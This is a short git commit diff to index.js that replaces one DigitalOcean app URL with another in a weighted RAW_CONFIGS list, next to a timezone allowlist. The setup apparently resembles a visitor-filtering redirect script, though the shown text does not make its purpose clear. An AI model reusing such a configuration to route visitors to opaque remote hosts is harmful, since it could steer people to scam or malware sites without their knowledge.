a50dc4c4f8f1235092ab13436fc2fb07164dc2aa
paalakash <palaksh452@gmail.com>
2026-06-23 14:22:04 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://coral-app-cx4he.ondigitalocean.app/Win0codejInfowj2n/", weight: 1.0 }
+    { url: "https://seashell-app-ym7zr.ondigitalocean.app/Win0codejInfowj2n/", weight: 1.0 }
 
 ];
 
